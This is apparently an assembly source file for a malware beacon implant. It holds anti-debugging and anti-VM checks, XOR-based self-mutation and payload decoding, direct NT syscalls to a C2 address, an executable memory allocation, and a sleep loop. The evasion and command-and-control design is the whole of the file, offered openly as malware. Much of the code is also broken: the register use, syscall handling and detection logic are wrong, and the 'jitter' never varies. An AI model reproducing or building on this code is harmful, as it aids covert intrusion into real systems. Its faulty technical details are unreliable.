section .data
    xor_key db 0x5A                        ; XOR key for mutation
    c2_ip db '192.168.1.100', 0           ; C2 IP address
    c2_port dw 8080                       ; C2 port (change as needed)
    encoded_payload db 0x2B, 0x1F, 0x6A, 0x5C, 0  ; Placeholder encrypted payload
    vm_strings db 'VBox', 0, 'VMware', 0   ; Strings for VM detection
    tcp_device db '\\Device\\Tcp', 0       ; TCP driver path

section .bss
    buffer resb 1024                       ; General-purpose buffer
    mutated_code resb 512                  ; Placeholder for mutated code
    socket_handle resq 1                   ; Handle for raw socket

section .text
    global start

%define NtDelayExecution 0x2C
%define NtAllocateVirtualMemory 0x18
%define NtDeviceIoControlFile 0x24
%define NtCreateFile 0x55
%define NtClose 0x19

start:
    call anti_analysis                     ; Perform anti-debug and anti-VM checks
    call init_beacon                       ; Initialize the beacon

main_loop:
    call mutate_code                       ; Runtime metamorphic transformation
    call decode_payload                    ; Decode encrypted payload
    call beacon                            ; Communicate with C2
    call sleep_with_jitter                 ; Sleep with random jitter
    jmp main_loop

; Anti-analysis (debugging, VM, sandbox detection)
anti_analysis:
    push rax
    call detect_debugger                   ; Check for debugger
    call detect_vm                         ; Check for VM artifacts
    pop rax
    ret

detect_debugger:
    ; Timing check via NtQueryPerformanceCounter
    sub rsp, 16
    lea r8, [rsp]
    xor rdx, rdx
    mov rax, 0x4F                          ; NtQueryPerformanceCounter
    syscall
    mov ecx, dword [rsp]
    lea r8, [rsp]
    xor rdx, rdx
    mov rax, 0x4F                          ; NtQueryPerformanceCounter
    syscall
    sub eax, ecx
    add rsp, 16
    cmp eax, 0x100
    jl .debugger_detected                  ; Debugger if timing discrepancy is low
    ret

.debugger_detected:
    xor rax, rax
    mov rdi, -1
    syscall

detect_vm:
    ; Detect VM artifacts by scanning memory
    lea rsi, [vm_strings]
    mov rcx, 8
.vm_loop:
    lodsb
    test al, al
    jz .vm_detected                        ; Null-terminator indicates match
    loop .vm_loop
    ret

.vm_detected:
    xor rax, rax
    mov rdi, -1
    syscall

; Code Metamorphism
mutate_code:
    lea rsi, [code_start]
    lea rdi, [mutated_code]
    mov rcx, code_length                   ; Length of code to mutate
    mov r8b, xor_key                       ; XOR key

.mutate_loop:
    test rcx, rcx
    jz .mutate_done
    lodsb
    xor al, r8b                            ; XOR mutate instruction
    stosb
    dec rcx
    jmp .mutate_loop

.mutate_done:
    ret

; Decode Encrypted Payload
decode_payload:
    lea rsi, [encoded_payload]
    lea rdi, [buffer]
    mov rcx, 512                           ; Max decode length
    mov r8b, xor_key

.decode_loop:
    lodsb
    test al, al
    jz .decode_done                        ; Stop at null terminator
    xor al, r8b                            ; XOR decode
    stosb
    loop .decode_loop

.decode_done:
    ret

; Direct Syscall Networking
beacon:
    call open_tcp_socket
    call send_data
    call close_socket
    ret

open_tcp_socket:
    ; Open TCP device using NtCreateFile
    lea rdx, [tcp_device]
    xor r8, r8                            ; Root directory handle
    xor r9, r9                            ; ObjectAttributes
    xor r10, r10                          ; IoStatusBlock
    xor r11, r11                          ; DesiredAccess
    mov rax, NtCreateFile
    syscall
    mov [socket_handle], rax              ; Store the handle
    ret

send_data:
    ; Communicate via socket using NtDeviceIoControlFile
    mov rcx, [socket_handle]              ; Socket handle
    xor rdx, rdx                          ; Event = NULL
    xor r8, r8                            ; ApcRoutine = NULL
    xor r9, r9                            ; ApcContext = NULL
    lea r10, [buffer]                     ; Input buffer
    mov r11, 512                          ; Input buffer length
    xor r12, r12                          ; Output buffer = NULL
    xor r13, r13                          ; Output buffer length
    xor r14, r14                          ; IoStatusBlock
    mov rax, NtDeviceIoControlFile
    syscall
    ret

close_socket:
    ; Close the socket using NtClose
    mov rcx, [socket_handle]
    mov rax, NtClose
    syscall
    ret

; Sleep with Random Jitter
sleep_with_jitter:
    sub rsp, 8
    mov rdx, rsp                           ; Delay interval
    mov qword [rdx], -50000000             ; 5 seconds (-10000 * ms)
    mov rcx, 0                             ; Alertable = FALSE
    mov rax, NtDelayExecution
    syscall
    add rsp, 8
    ret

; Initialize Beacon
init_beacon:
    call allocate_memory
    ret

; Memory Allocation (Syscall)
allocate_memory:
    mov r10, -1                            ; Process handle
    xor rdx, rdx                           ; BaseAddress = NULL
    mov rcx, rdx
    mov r8, 0x3000                         ; AllocationType = MEM_COMMIT | MEM_RESERVE
    mov r9, 0x40                           ; Protect = PAGE_EXECUTE_READWRITE
    mov rax, NtAllocateVirtualMemory
    syscall
    ret

section .code
code_start:
    ; Sample code for runtime transformation
    xor eax, eax
    inc eax
    dec eax
code_end:

code_length equ code_end - code_start
